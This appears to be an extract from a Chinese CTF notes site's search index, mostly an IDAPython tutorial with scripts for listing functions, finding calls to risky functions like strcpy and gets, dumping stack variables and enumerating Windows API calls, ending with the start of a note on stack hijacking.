member is 4 bytes long and starts 5100 \u2502 at offset 2, then 2,3,4,5 denote 5101 \u2502 the same structure member. 5102 \u2502 5103 \u2502 @return: None if bad structure type ID is passed 5104 \u2502 or no such member in the structure 5105 \u2502 otherwise returns name of the specified member. 5106 \u2502 5107 \u2502 s = ida_struct.get_struc(sid) 5108 \u2502 if not s: 5109 \u2502 return None 5110 \u2502 5111 \u2502 m = ida_struct.get_member(s, member_offset) 5112 \u2502 if not m: 5113 \u2502 return None 5114 \u2502 5115 \u2502 return ida_struct.get_member_name(m.id) idc GetMemberSize \u5f97\u5230\u4e00\u4e2a\u53d8\u91cf\u7684\u7ed3\u6784\u6240\u5360\u5b57\u8282\u6570 5146 \u2502 def get_member_size(sid, member_offset): 5147 \u2502 5148 \u2502 Get size of a member 5149 \u2502 5150 \u2502 @param sid: structure type ID 5151 \u2502 @param member_offset: member offset. The offset can be 5152 \u2502 any offset in the member. For example, 5153 \u2502 is a member is 4 bytes long and starts 5154 \u2502 at offset 2, then 2,3,4,5 denote 5155 \u2502 the same structure member. 5156 \u2502 5157 \u2502 @return: None if bad structure type ID is passed, 5158 \u2502 or no such member in the structure 5159 \u2502 otherwise returns size of the specified 5160 \u2502 member in bytes. 5161 \u2502 5162 \u2502 s = ida_struct.get_struc(sid) 5163 \u2502 if not s: 5164 \u2502 return None 5165 \u2502 5166 \u2502 m = ida_struct.get_member(s, member_offset) 5167 \u2502 if not m: 5168 \u2502 return None 5169 \u2502 5170 \u2502 return ida_struct.get_member_size(m) 5173 \u2502 def get_member_flag(sid, member_offset): 5174 \u2502 5175 \u2502 Get type of a member \u5176\u4ed6\u51fd\u6570 \u53d6\u503c Byte(ea) Word(ea) Dword(ea) Qword(ea) GetFloat(ea) GetDouble(ea) GetManyBytes(ea, size, use_dbg = False) GetString(ea, length = -1, strtype = STRTYPE_C) GetFlags(ea).isCode() / .isData() / .isUnknown() \u6570\u636e\u6216\u4ee3\u7801\u7684 to / from DataRefsTo(ea) DataRefsFrom(ea) | XrefsTo(ea, flag=0) XrefsFrom(ea, flag=0) / CodeRefsTo(ea, flag=0) CodeRefsFrom(ea, flag=0) \u5206\u5272\u51fd\u6570\u4e2d\u6307\u4ee4\u5730\u5740 FuncItems(start) \u4e00\u822c\u548c GetDisasm() \u4e00\u8d77\u4f7f\u7528 317 \u2502 def FuncItems(start): 318 \u2502 319 \u2502 Get a list of function items 320 \u2502 321 \u2502 @param start: address of the function 322 \u2502 323 \u2502 @return: ea of each item in the function 324 \u2502 325 \u2502 func = ida_funcs.get_func(start) 326 \u2502 if not func: 327 \u2502 return 328 \u2502 fii = ida_funcs.func_item_iterator_t() 329 \u2502 ok = fii.set(func) 330 \u2502 while ok: 331 \u2502 yield fii.current() 332 \u2502 ok = fii.next_code() \u53cd\u6c47\u7f16 GetDisasm(ea) Patch \u6587\u4ef6 PatchByte(ea, value) PatchWord(ea, value) PatchDword(ea, value) \u53d6\u5f53\u524d\u5730\u5740 here() ScreenEA() \u5b9e\u4f8b \u4e0b\u5348\u5199\u4e86\u4e00\u4e2a\u7528\u6765\u67e5\u67d0\u4e9b\u51fd\u6570\u4e2d\u7684\u5e93\u51fd\u6570\u8c03\u7528\u7684\u811a\u672c \u8be5\u67e5\u8be2\u4e86\u4e00\u4e0b main \u51fd\u6570\u548c main \u51fd\u6570\u5f00\u542f\u7ebf\u7a0b\u4e2d\u51fd\u6570\u7684\u8c03\u7528\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a\u5f88\u5f3a\u7684\u51fd\u6570 GetDisasm() \u53ef\u4ee5\u5c06 IDA \u4e2d\u5206\u6790\u7ed3\u679c\u4e5f\u6253\u5370\u51fa\u6765\uff0c\u610f\u601d\u5c31\u662f \u6bd4\u5982 call esi \uff0c\u5728 GetDisasm() \u4f1a\u6253\u5370 call esi ; Function \u8fd9\u6837\u5199\u5206\u6790\u811a\u672c\u8d77\u6765\u5c31\u5f88\u5bb9\u6613\uff0c\u4ee5\u4e0b\u811a\u672c\u662f\u653e\u5728 IDA \u4e2d\u8dd1\u7684\uff0c\u6240\u4ee5\u6ca1\u52a0 idc.Wait() \u548c idc.Exit(0) \u5b9e\u4f8b\u7684\u9898\u76ee\u6211\u653e\u5728 github \u4e0a\u9762\u4e86 Lab05 # -*- coding: utf-8 -*- from idaapi import * from idautils import * import idc # github idapython ex_import.py def Enum_Import_WinApi(): def imp_cb(ea, name, offset): if name: WinApiDir[ea] = name # True - Continue enumeration # False - Stop enumeration return True WinApiDir = {} WinDll = [ ] nimps = get_import_module_qty() for i in xrange(0, nimps): name = get_import_module_name(i) enum_import_names(i, imp_cb) return WinApiDir def AddAddr(CalledAddr, CallWinApi, WinApiDir, CalledName= ): if CalledAddr != 0: CalledName = WinApiDir[CalledAddr] if CalledName not in CallWinApi: # \u5982\u679c CallWinApi \u91cc\u9762\u6ca1\u6709\uff0c\u5c31\u6dfb\u52a0 CallWinApi.append(CalledName) def SearchFunc(addr): # \u539f\u672c\u60f3\u7528\u4f5c\u5411\u4e0a\u67e5\u627e mov \u7684\u51fd\u6570\uff0c\u4f46\u662f\u53d1\u73b0 GetDisasm \u662f\u4e2a\u795e\u4ed9\u51fd\u6570 return def SearchWinApi(ea, CallWinApi, WinApiDir): for addr in FuncItems(ea): if GetMnem(addr) == call : # \u5224\u65ad\u6307\u4ee4\u662f\u5426\u4e3a call CalledAddr = GetOperandValue(addr, 0) # \u5f97\u5230\u88ab call \u51fd\u6570\u5730\u5740 # print(GetDisasm(addr)) # print(GetOpnd(addr, 0)) if CalledAddr in WinApiDir.keys(): # \u5982\u679c\u51fd\u6570\u5730\u5740\u5728\u679a\u4e3e\u7684 WinApiDir \u91cc\u9762\u5c31\u5c1d\u8bd5\u6dfb\u52a0 AddAddr(CalledAddr, CallWinApi, WinApiDir) else: # \u7cfb\u7edf\u51fd\u6570\u8df3\u8f6c\u4e00\u6b65\u624d\u5230\u7ed3\u679c \u4f8b\u5982 strlen: jmp ds:__imp_strlen if GetMnem(CalledAddr) == jmp : CalledAddr = GetOperandValue(CalledAddr, 0) AddAddr(CalledAddr, CallWinApi, WinApiDir) else : op = GetOpnd(addr, 0) if op == esi or op == ebx or op == eax or op == ebp : \u53ef\u4ee5\u4e0d\u5fc5\u8fd9\u4e48\u5199\uff0c\u56e0\u4e3a GetDisasm \u4f1a\u5c06 IDA \u5206\u6790\u7684 esi ebx eax ebp \u6253\u5370\u51fa\u6765 if op == ebp : # \u67e5\u770b\u6e90\u7801\u53d1\u73b0 op == ebp \u65f6 \u53ea\u6709\u8c03\u7528 closesocket \u7684\u65f6\u5019 if closesocket in CallWinApi: return else : CallWinApi.append( closesocket ) else : # \u5411\u4e0a\u67e5\u627e mov \u6307\u4ee4 disasm = GetDisasm(addr) CalledName = disasm[disasm.find( ; )+1:] AddAddr(0, CallWinApi, WinApiDir, CalledName) if __name__ == __main__ : Main = [0x1000D02E] sub_func = [0x10001074, 0x10001365, 0x10001656] WinApiDir = {} CallWinApi = [] flag = 1 WinApiDir = Enum_Import_WinApi() # print(WinApiDir) if flag : for ea in Main: SearchWinApi(ea, CallWinApi, WinApiDir) else: for ea in sub_func: SearchWinApi(ea, CallWinApi, WinApiDir) print(CallWinApi) \u53c2\u8003 \u811a\u672c | https://blog.csdn.net/ojshilu/article/details/12905405 \u535a\u5ba2 | https://blog.csdn.net/qq1084283172/article/details/64130118 part1-6 | https://unit42.paloaltonetworks.com/using-idapython-to-make-your-life-easier-part-1/ \u5b98\u65b9\u6587\u6863| https://www.hex-rays.com/products/ida/support/idapython_docs/","title":"IDA IDApython"},{"location":"pwn/IDApython/#ida-idapython","text":"idc \u548c IDApython \u5e2e\u52a9\u5206\u6790\u8005\u5229\u7528\u4e0e IDA \u8fdb\u884c\u4ea4\u4e92\uff0c\u5f97\u5230\u81ea\u52a8\u5316\u5206\u6790\u7a0b\u5e8f\u7684\u7ed3\u679c","title":"IDA \u5f3a\u5927\u7684\u63d2\u4ef6 IDApython"},{"location":"pwn/IDApython/#idapython","text":"IDApython \u7684\u5b89\u88c5\u53ef\u4ee5\u5f88\u5bb9\u6613\u5728\u7f51\u4e0a\u67e5\u5230\uff0c\u4f46\u662f\u5bf9\u4e8e IDApython \u6559\u7a0b\u7684\u8d44\u6599\u9664\u4e86\u770b\u5230\u7684\u4e00\u4e2a\u5b98\u65b9\u6587\u6863\u4ee5\u5916\u6ca1\u770b\u5230\u7279\u522b\u591a\u7279\u522b\u597d\u7684\u8d44\u6599\uff0c\u4e8e\u662f\u60f3\u7a0d\u5fae\u8bb0\u5f55\u4e00\u4e0b\u81ea\u5df1\u641e IDApython \u9047\u5230\u7684\u4e00\u4e9b\u5751\u548c IDApython \u5e38\u7528\u7684\u51fd\u6570 (\u5e0c\u671b\u5b66\u5f1f\u548c\u5b66\u59b9\u660e\u5e74\u505a\u7684\u65f6\u5019\u4e0d\u4f1a\u6ca1\u8d44\u6599 =.=","title":"IDApython"},{"location":"pwn/IDApython/#idapython_1","text":"\u9996\u5148\u786e\u8ba4\u81ea\u5df1\u7684 IDApython \u662f\u5426\u88c5\u597d\u4e86\uff0c\u6709\u4e24\u79cd\u529e\u6cd5\u3002 \u4e00\u79cd\u4ece IDA \u4e0a\u9762\u7684 File- Script Command \u6253\u5f00\u4e4b\u540e\u770b Scripting language \u662f\u5426\u662f\u5b58\u5728 IDC \u548c Python\uff0c \u7136\u540e\u53ef\u4ee5\u6d4b\u8bd5\u4e00\u4e0b\u5e93\u662f\u5426\u5168\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u5229\u7528\u4e00\u4e2a\u5c0f\u811a\u672c\u68c0\u6d4b import \u5e93\u662f\u5426\u4f1a\u62a5\u9519 import idaapi import idc import idautils if __name__ == __main__ : fp = open( Test.txt , w ) fp.write( Success\\n ) fp.close() \u5f53\u7136\u8fd0\u884c\u811a\u672c\u7684\u65f6\u5019\u9700\u8981\u7528 IDA \u6253\u5f00\u4e00\u4e2a\u968f\u4fbf\u7684\u6587\u4ef6\uff0c\u7136\u540e\u8fd0\u884c\u5b8c\u811a\u672c\u53ef\u4ee5\u5728\u90a3\u4e2a\u6587\u4ef6\u7684\u90a3\u4e00\u5c42\u91cc\u9762\u591a\u51fa\u6765\u4e00\u4e2a Test.txt \u6587\u4ef6\uff0c\u91cc\u9762\u5199\u7740 Success \u5c31\u8bf4\u660e\u6ca1\u95ee\u9898\uff0c\u5426\u5219\u5e93\u5c31\u662f\u6ca1\u88c5\u5168 \u53e6\u5916\u4e00\u79cd\u529e\u6cd5\u5c31\u662f\u5728 IDA \u6700\u4e0b\u9762\u6709\u4e00\u4e2a Output window \u4e0b\u9762\u6709\u4e00\u4e2a\u53ef\u9009\u7684\uff0c\u67e5\u770b\u662f\u5426\u5b58\u5728 IDC \u548c Python\uff0c\u5728\u91cc\u9762\u9009 Python \u7136\u540e\u5c1d\u8bd5 import \u4e09\u4e2a\u5e93\u5c31\u53ef\u4ee5\u4e86\uff0c\u6ca1\u62a5\u9519\u5c31\u6ca1\u95ee\u9898\u3002 import \u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u5e93\u8bd5\u4e00\u4e0b import requests \u5c31\u4f1a\u53d1\u73b0\u62a5\u9519 (\u5982\u679c\u6ca1\u5b89\u88c5\u597d\uff0c\u53ef\u4ee5\u76f4\u63a5\u67e5\u8be2\u543e\u7231\u7834\u89e3 IDA 7.0 \u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u5df2\u7ecf\u7eff\u8272\u7248+\u914d\u597d Python \u7684 IDA","title":"\u5b89\u88c5 IDApython"},{"location":"pwn/IDApython/#_1","text":"\u4e0b\u9762\u662f\u6211\u770b\u5230\u7684\u4e00\u4e9b\u811a\u672c\uff0c\u6211\u62ff\u5230\u672c\u5730\u6d4b\u8bd5\u8fc7\u80fd\u8dd1\u7684","title":"\u4e00\u4e9b\u811a\u672c"},{"location":"pwn/IDApython/#example-01","text":"\u6253\u5370\u5168\u90e8\u51fd\u6570\u7684\u540d\u5b57 # -*- coding: utf-8 -*- from idaapi import * from idautils import * import idc idc.Wait() # \u5355\u7ebf\u7a0b\u7684\u611f\u89c9\uff0c\u5206\u6790\u5b8c\u4e00\u4e2a\u4e4b\u540e\u624d\u4f1a\u8fd0\u884c\u540e\u7eed\u811a\u672c ea = BeginEA() # \u627e\u5230\u7a0b\u5e8f _start (\u9488\u5bf9 ELF \u800c\u8a00)\u3000\u8fd4\u56de\u662f type long fp = open( Z:\\\\home\\\\vangelis\\\\Desktop\\\\rop_fun_output.txt , w ) fp.write( check\\n ) idx = 0 # \u5728.text\u6bb5\u4e2d SegStart() \u627e\u5230\u7a0b\u5e8f\u5730\u5740\u6700\u5c0f\u7684\u6c47\u7f16\u6307\u4ee4\u7684\u5730\u5740\uff0cSegEnd() \u627e\u5230\u7a0b\u5e8f\u5730\u5740\u6700\u5927\u7684\u6c47\u7f16\u6307\u4ee4\u7684\u5730\u5740 for funcea in Functions(SegStart(ea), SegEnd(ea)): # Functions() \u8fd4\u56de\u4e3a type generator functionName = GetFunctionName(funcea) # funcea \u7c7b\u578b\u4e3a\u3000 type long \u4e3a\u5730\u5740 GetFunctionName() \u5c06\u5730\u5740\u8f6c\u6362\u4e3a\u51fd\u6570\u540d fp.write( %d % idx) fp.write(functionName + \\n ) idx += 1 fp.close() idc.Exit(0) # \u5728\u811a\u672c\u8fd0\u884c\u7ed3\u675f\u4e4b\u540e\u80fd\u591f\u81ea\u52a8\u5173\u95ed IDA","title":"example 01"},{"location":"pwn/IDApython/#idc-wait","text":"Wait(): $ grep -H Wait ./*.py ./idc_bc695.py:def Wait(): return auto_wait() idc.py 412 \u2502 def auto_wait(): 413 \u2502 414 \u2502 Process all entries in the autoanalysis queue 415 \u2502 Wait for the end of autoanalysis 416 \u2502 417 \u2502 @note: This function will suspend execution of the calling script 418 \u2502 till the autoanalysis queue is empty. 419 \u2502 420 \u2502 return ida_auto.auto_wait() \u5728 IDA \u6587\u4ef6\u91cc\u9762\u7528 powershell \u6253\u5f00\uff0c\u8fd0\u884c .\\ida.exe -c -S\"test.py\" input_file \u5373\u53ef\uff0c -c -S \u662f\u4e24\u4e2a\u53c2\u6570\uff0c \u7136\u540e\u6211\u795e\u7ecf\u5200\uff0c\u8dd1\u5230 linux \u91cc\u9762\u6765\u8bd5\u884c\u4e0d\u884c\uff0c\u6211\u7684 IDA \u653e\u5728 ~/ \u76ee\u5f55\u4e0b\uff0c\u7136\u540e\u8fd0\u884c\u811a\u672c\u7684\u65f6\u5019\u5f00\u59cb\u62a5\u9519\uff0c\u540e\u6765\u89c9\u5f97\u662f\u56e0\u4e3a\u7528\u7684 wine \u8c03\u7528\u7684 ida.exe \u6240\u4ee5\u5728 -S \u91cc\u9762\u8fd8\u662f\u8981\u7528 windows \u4e0b\u53cd\u659c\u6760\u800c\u4e0d\u662f\u659c\u6760 # vangelis @ vangelis-PC in ~/IDA [22:47:42] C:2 $ ./ida.exe -c -S .\\Vangelis\\test.py ~/Desktop/Analysis_File/rop/rop \u540c\u65f6\u5728\u811a\u672c\u91cc\u9762\u4e5f\u662f\u8981\u7528\u6620\u5c04\u8fc7\u53bb\u7684\u5730\u5740\uff0c\u6240\u4ee5\u7528\u7684 Z:\\\\home\\\\vangelis\\\\Desktop\\\\rop_fun_output.txt \u540e\u6765\u518d\u6539\u8fdb\u4e00\u4e0b\uff0c\u53d8\u6210\u4e86 nohup ./ida.exe -c -S\".\\Vangelis\\test.py\" ~/Desktop/Analysis_File/rop/rop outfile 2 1 \u628a\u6807\u51c6\u8f93\u51fa\u548c\u9519\u8bef\u5168\u90e8\u8f93\u51fa\u5230 outfile \u6587\u4ef6\u4e2d \u518d\u540e\u6765\u89c9\u5f97\u6bcf\u6b21\u5f00 IDA \u5341\u5206\u4e0d\u8212\u670d\u5c31\u67e5\u4e86\u4e00\u4e0b\u8fd0\u884c IDA \u7684\u53c2\u6570\uff0c\u6700\u540e\u7528\u7684 -B -S -B batch mode. IDA will generate .IDB and .ASM files automatically \u56e0\u4e3a\u6700\u540e\u4f1a\u4ea7\u751f\u76f8\u5e94\u7684 .idb \u6216\u8005 .asm \u6240\u4ee5\u6700\u540e\u5904\u7406\u4e00\u4e0b\uff0c\u4e0d\u5904\u7406\u5176\u5b9e\u4e5f\u6ca1\u4ec0\u4e48","title":"idc Wait()"},{"location":"pwn/IDApython/#example-02","text":"\u5bfb\u627e\u5371\u9669\u51fd\u6570\u7684\u88ab\u5f15\u7528\u7684\u5730\u5740 # -*- coding: utf-8 -*- from idaapi import * from idautils import * import idc idc.Wait() danger_funcs = [ strcpy , read , gets ] fp = open( Z:\\\\home\\\\vangelis\\\\Desktop\\\\Analysis_File\\\\rop\\\\rop_danger_call.txt , w ) fp.write( check\\n ) for func in danger_funcs : fp.write( #############\\n ) fp.write(func + \\n ) addr = LocByName(func) if addr != BADADDR: cross_regs = CodeRefsTo(addr, 0) for ref in cross_regs: fp.write(str(hex(ref)) + \\n ) fp.close() idc.Exit(0)","title":"example 02"},{"location":"pwn/IDApython/#idc-locbyname","text":"\u7ecf\u8fc7\u5c1d\u8bd5 LocByName \u51fd\u6570\u5b58\u5728\u5219\u8fd4\u56de\u51fd\u6570\u5730\u5740\uff0c\u5426\u5219\u8fd4\u56de 0xffffffff (32\u4f4d) \u800c BADADDR \u5c31\u662f 0xffffffff (32\u4f4d) Python hex(BADADDR) 0xffffffffL Python hex(LocByName( ABCD )) 0xffffffffL $ grep -H LocByName ./*.py ./idc_bc695.py:def LocByName(name): return get_name_ea_simple(name) $ grep -H get_name_ea_simple ./*.py ./idc.py:def get_name_ea_simple(name): 1879 \u2502 def get_name_ea_simple(name): 1880 \u2502 1881 \u2502 Get linear address of a name 1882 \u2502 1883 \u2502 @param name: name of program byte 1884 \u2502 1885 \u2502 @return: address of the name 1886 \u2502 BADADDR - No such name 1887 \u2502 1888 \u2502 return ida_name.get_name_ea(BADADDR, name) 72 \u2502 __EA64__ = ida_idaapi.BADADDR == 0xFFFFFFFFFFFFFFFFL 73 \u2502 WORDMASK = 0xFFFFFFFFFFFFFFFF if __EA64__ else 0xFFFFFFFF","title":"idc LocByName"},{"location":"pwn/IDApython/#idatils-coderefsto","text":"\u627e\u5230 to \u8be5\u5730\u5740\u7684\u4e00\u4e2a\u5217\u8868 Python CodeRefsTo(0x806d290L, 0) generator object refs at 0x000000000C26B2D0 68 \u2502 def CodeRefsFrom(ea, flow): 69 \u2502 70 \u2502 Get a list of code references from ea 71 \u2502 72 \u2502 @param ea: Target address 73 \u2502 @param flow: Follow normal code flow or not 74 \u2502 @type flow: Boolean (0/1, False/True) 75 \u2502 76 \u2502 @return: list of references (may be empty list) 77 \u2502 78 \u2502 Example:: 79 \u2502 80 \u2502 for ref in CodeRefsFrom(get_screen_ea(), 1): 81 \u2502 print ref 82 \u2502 83 \u2502 if flow == 1: 84 \u2502 return refs(ea, ida_xref.get_first_cref_from, ida_xref.get_next_cref_from) 85 \u2502 else: 86 \u2502 return refs(ea, ida_xref.get_first_fcref_from, ida_xref.get_next_fcref_from)","title":"idatils CodeRefsTo"},{"location":"pwn/IDApython/#example-03","text":"\u6253\u5370\u51fd\u6570\u6808\u4e2d\u7684\u5c40\u90e8\u53d8\u91cf from idaapi import * from idautils import * import idc import types if __name__ == __main__ : idc.Wait() fp = open( Z:\\\\home\\\\vangelis\\\\Desktop\\\\Analysis_File\\\\rop\\\\stack-member.txt , w ) fp.write( check\\n ) ea = BeginEA() for func in Functions(SegStart(ea), SegEnd(ea)): funcName = GetFunctionName(func) # if(funcName != overflow ): # continue fp.write( ###############\\n ) fp.write( Function Name is %s\\n % funcName) stack_frame = GetFrame(func) frame_size = GetStrucSize(stack_frame) fp.write( frame_size: %d\\n % frame_size) frame_counter = 0 while frame_counter frame_size: stack_var = GetMemberName(stack_frame, frame_counter) if type(stack_var) == type( a ): fp.write( [*] Function:%s - Stack Variable:%s(%d bytes)\\n % (funcName, stack_var, GetMemberSize(stack_frame, frame_counter))) try : frame_counter = frame_counter + GetMemberSize(stack_frame, frame_counter) except: frame_counter += 1 else : frame_counter += 1 fp.close() idc.Exit(0) \u6ce8\uff1a stack frame \u662f\u4ece\u67d0\u4e00\u51fd\u6570\u7684 \u53c2\u6570\u5230\u6808\u9876 \u4e4b\u95f4\u5168\u90e8\u5185\u5bb9","title":"example 03"},{"location":"pwn/IDApython/#idc-getmembername","text":"\u901a\u8fc7 stack id \u548c offset \u5f97\u5230\u53d8\u91cf\u7684\u540d\u5b57 Python stack = GetFrame(0x804887c) # overflow function s address Python hex(stack) 0xff00006cL Python GetMemberName(stack, 0xc) var_C $ grep -H GetMemberName ./*.py ./idc_bc695.py:def GetMemberName(id, member_offset): return get_member_name(id, member_offset) 5092 \u2502 def get_member_name(sid, member_offset): 5093 \u2502 5094 \u2502 Get name of a member of a structure 5095 \u2502 5096 \u2502 @param sid: structure type ID 5097 \u2502 @param member_offset: member offset. The offset can be 5098 \u2502 any offset in the member. For example, 5099 \u2502 is a member is 4 bytes long and starts 5100 \u2502 at offset 2, then 2,3,4,5 denote 5101 \u2502 the same structure member. 5102 \u2502 5103 \u2502 @return: None if bad structure type ID is passed 5104 \u2502 or no such member in the structure 5105 \u2502 otherwise returns name of the specified member. 5106 \u2502 5107 \u2502 s = ida_struct.get_struc(sid) 5108 \u2502 if not s: 5109 \u2502 return None 5110 \u2502 5111 \u2502 m = ida_struct.get_member(s, member_offset) 5112 \u2502 if not m: 5113 \u2502 return None 5114 \u2502 5115 \u2502 return ida_struct.get_member_name(m.id)","title":"idc GetMemberName"},{"location":"pwn/IDApython/#idc-getmembersize","text":"\u5f97\u5230\u4e00\u4e2a\u53d8\u91cf\u7684\u7ed3\u6784\u6240\u5360\u5b57\u8282\u6570 5146 \u2502 def get_member_size(sid, member_offset): 5147 \u2502 5148 \u2502 Get size of a member 5149 \u2502 5150 \u2502 @param sid: structure type ID 5151 \u2502 @param member_offset: member offset. The offset can be 5152 \u2502 any offset in the member. For example, 5153 \u2502 is a member is 4 bytes long and starts 5154 \u2502 at offset 2, then 2,3,4,5 denote 5155 \u2502 the same structure member. 5156 \u2502 5157 \u2502 @return: None if bad structure type ID is passed, 5158 \u2502 or no such member in the structure 5159 \u2502 otherwise returns size of the specified 5160 \u2502 member in bytes. 5161 \u2502 5162 \u2502 s = ida_struct.get_struc(sid) 5163 \u2502 if not s: 5164 \u2502 return None 5165 \u2502 5166 \u2502 m = ida_struct.get_member(s, member_offset) 5167 \u2502 if not m: 5168 \u2502 return None 5169 \u2502 5170 \u2502 return ida_struct.get_member_size(m) 5173 \u2502 def get_member_flag(sid, member_offset): 5174 \u2502 5175 \u2502 Get type of a member","title":"idc GetMemberSize"},{"location":"pwn/IDApython/#_2","text":"\u53d6\u503c Byte(ea) Word(ea) Dword(ea) Qword(ea) GetFloat(ea) GetDouble(ea) GetManyBytes(ea, size, use_dbg = False) GetString(ea, length = -1, strtype = STRTYPE_C) GetFlags(ea).isCode() / .isData() / .isUnknown() \u6570\u636e\u6216\u4ee3\u7801\u7684 to / from DataRefsTo(ea) DataRefsFrom(ea) | XrefsTo(ea, flag=0) XrefsFrom(ea, flag=0) / CodeRefsTo(ea, flag=0) CodeRefsFrom(ea, flag=0) \u5206\u5272\u51fd\u6570\u4e2d\u6307\u4ee4\u5730\u5740 FuncItems(start) \u4e00\u822c\u548c GetDisasm() \u4e00\u8d77\u4f7f\u7528 317 \u2502 def FuncItems(start): 318 \u2502 319 \u2502 Get a list of function items 320 \u2502 321 \u2502 @param start: address of the function 322 \u2502 323 \u2502 @return: ea of each item in the function 324 \u2502 325 \u2502 func = ida_funcs.get_func(start) 326 \u2502 if not func: 327 \u2502 return 328 \u2502 fii = ida_funcs.func_item_iterator_t() 329 \u2502 ok = fii.set(func) 330 \u2502 while ok: 331 \u2502 yield fii.current() 332 \u2502 ok = fii.next_code() \u53cd\u6c47\u7f16 GetDisasm(ea) Patch \u6587\u4ef6 PatchByte(ea, value) PatchWord(ea, value) PatchDword(ea, value) \u53d6\u5f53\u524d\u5730\u5740 here() ScreenEA()","title":"\u5176\u4ed6\u51fd\u6570"},{"location":"pwn/IDApython/#_3","text":"\u4e0b\u5348\u5199\u4e86\u4e00\u4e2a\u7528\u6765\u67e5\u67d0\u4e9b\u51fd\u6570\u4e2d\u7684\u5e93\u51fd\u6570\u8c03\u7528\u7684\u811a\u672c \u8be5\u67e5\u8be2\u4e86\u4e00\u4e0b main \u51fd\u6570\u548c main \u51fd\u6570\u5f00\u542f\u7ebf\u7a0b\u4e2d\u51fd\u6570\u7684\u8c03\u7528\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a\u5f88\u5f3a\u7684\u51fd\u6570 GetDisasm() \u53ef\u4ee5\u5c06 IDA \u4e2d\u5206\u6790\u7ed3\u679c\u4e5f\u6253\u5370\u51fa\u6765\uff0c\u610f\u601d\u5c31\u662f \u6bd4\u5982 call esi \uff0c\u5728 GetDisasm() \u4f1a\u6253\u5370 call esi ; Function \u8fd9\u6837\u5199\u5206\u6790\u811a\u672c\u8d77\u6765\u5c31\u5f88\u5bb9\u6613\uff0c\u4ee5\u4e0b\u811a\u672c\u662f\u653e\u5728 IDA \u4e2d\u8dd1\u7684\uff0c\u6240\u4ee5\u6ca1\u52a0 idc.Wait() \u548c idc.Exit(0) \u5b9e\u4f8b\u7684\u9898\u76ee\u6211\u653e\u5728 github \u4e0a\u9762\u4e86 Lab05 # -*- coding: utf-8 -*- from idaapi import * from idautils import * import idc # github idapython ex_import.py def Enum_Import_WinApi(): def imp_cb(ea, name, offset): if name: WinApiDir[ea] = name # True - Continue enumeration # False - Stop enumeration return True WinApiDir = {} WinDll = [ ] nimps = get_import_module_qty() for i in xrange(0, nimps): name = get_import_module_name(i) enum_import_names(i, imp_cb) return WinApiDir def AddAddr(CalledAddr, CallWinApi, WinApiDir, CalledName= ): if CalledAddr != 0: CalledName = WinApiDir[CalledAddr] if CalledName not in CallWinApi: # \u5982\u679c CallWinApi \u91cc\u9762\u6ca1\u6709\uff0c\u5c31\u6dfb\u52a0 CallWinApi.append(CalledName) def SearchFunc(addr): # \u539f\u672c\u60f3\u7528\u4f5c\u5411\u4e0a\u67e5\u627e mov \u7684\u51fd\u6570\uff0c\u4f46\u662f\u53d1\u73b0 GetDisasm \u662f\u4e2a\u795e\u4ed9\u51fd\u6570 return def SearchWinApi(ea, CallWinApi, WinApiDir): for addr in FuncItems(ea): if GetMnem(addr) == call : # \u5224\u65ad\u6307\u4ee4\u662f\u5426\u4e3a call CalledAddr = GetOperandValue(addr, 0) # \u5f97\u5230\u88ab call \u51fd\u6570\u5730\u5740 # print(GetDisasm(addr)) # print(GetOpnd(addr, 0)) if CalledAddr in WinApiDir.keys(): # \u5982\u679c\u51fd\u6570\u5730\u5740\u5728\u679a\u4e3e\u7684 WinApiDir \u91cc\u9762\u5c31\u5c1d\u8bd5\u6dfb\u52a0 AddAddr(CalledAddr, CallWinApi, WinApiDir) else: # \u7cfb\u7edf\u51fd\u6570\u8df3\u8f6c\u4e00\u6b65\u624d\u5230\u7ed3\u679c \u4f8b\u5982 strlen: jmp ds:__imp_strlen if GetMnem(CalledAddr) == jmp : CalledAddr = GetOperandValue(CalledAddr, 0) AddAddr(CalledAddr, CallWinApi, WinApiDir) else : op = GetOpnd(addr, 0) if op == esi or op == ebx or op == eax or op == ebp : \u53ef\u4ee5\u4e0d\u5fc5\u8fd9\u4e48\u5199\uff0c\u56e0\u4e3a GetDisasm \u4f1a\u5c06 IDA \u5206\u6790\u7684 esi ebx eax ebp \u6253\u5370\u51fa\u6765 if op == ebp : # \u67e5\u770b\u6e90\u7801\u53d1\u73b0 op == ebp \u65f6 \u53ea\u6709\u8c03\u7528 closesocket \u7684\u65f6\u5019 if closesocket in CallWinApi: return else : CallWinApi.append( closesocket ) else : # \u5411\u4e0a\u67e5\u627e mov \u6307\u4ee4 disasm = GetDisasm(addr) CalledName = disasm[disasm.find( ; )+1:] AddAddr(0, CallWinApi, WinApiDir, CalledName) if __name__ == __main__ : Main = [0x1000D02E] sub_func = [0x10001074, 0x10001365, 0x10001656] WinApiDir = {} CallWinApi = [] flag = 1 WinApiDir = Enum_Import_WinApi() # print(WinApiDir) if flag : for ea in Main: SearchWinApi(ea, CallWinApi, WinApiDir) else: for ea in sub_func: SearchWinApi(ea, CallWinApi, WinApiDir) print(CallWinApi)","title":"\u5b9e\u4f8b"},{"location":"pwn/IDApython/#_4","text":"\u811a\u672c | https://blog.csdn.net/ojshilu/article/details/12905405 \u535a\u5ba2 | https://blog.csdn.net/qq1084283172/article/details/64130118 part1-6 | https://unit42.paloaltonetworks.com/using-idapython-to-make-your-life-easier-part-1/ \u5b98\u65b9\u6587\u6863| https://www.hex-rays.com/products/ida/support/idapython_docs/","title":"\u53c2\u8003"},{"location":"pwn/stack-hijack/","text":"stack hijack hijack ret \u6700\u5e38\u89c1\u7684\u5c31\u662f\uff0c\u6808\u6ea2\u51fa hijack ret hijack ebp \u6709\u7684\u65f6\u5019\uff0c\u65e0\u6cd5\u6808\u6ea2\u51fa\u5230 ret \uff0c\u65e0\u6cd5\u76f4\u63a5 hijack \u4e0a ret addr \uff0c\u4f46\u662f\u53ef\u4ee5 hijack ebp \uff0c\u7531\u4e8e x86 \u67b6\u6784\u7684\u539f\u56e0\uff0c\u5728\u51fd\u6570\u8fd4\u56de\u7684\u65f6\u5019\uff0c\u4f1a\u901a\u8fc7\u673a\u5236\uff0c\u5c06 ebp+0x4(\u6216 rbp+0x8 ) \u8ba4\u4e3a\u6210 ret addr \uff0c\u56e0\u6b64\u5c31\u53ef\u4ee5\u901a\u8fc7\u6ea2\u51fa\u5230 ebp 